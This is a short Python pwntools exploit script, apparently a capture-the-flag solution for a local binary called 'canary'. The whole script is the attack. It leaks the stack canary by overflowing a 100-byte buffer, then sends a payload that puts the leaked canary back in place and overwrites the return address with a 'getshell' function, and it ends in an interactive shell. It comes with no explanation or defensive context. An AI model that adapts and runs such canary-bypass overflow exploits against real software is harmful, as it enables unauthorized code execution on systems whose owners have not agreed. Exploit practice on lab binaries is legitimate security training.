#!/usr/bin/env python
from pwn import *

sh = process('./canary')
context.log_level = 'debug'
elf = ELF('./canary')

get_shell = elf.symbols['getshell']

sh.recv()

padding = 'a'*100
sh.sendline(padding)
sh.recvuntil('a'*100)
canary = u32(sh.recv()[:4])-0xa
log.info('canary: '+hex(canary))
log.info('get_shell: '+hex(get_shell))
payload = padding + p32(canary) + 'b'*12 + p32(get_shell)

sh.sendline(payload)

sh.interactive()
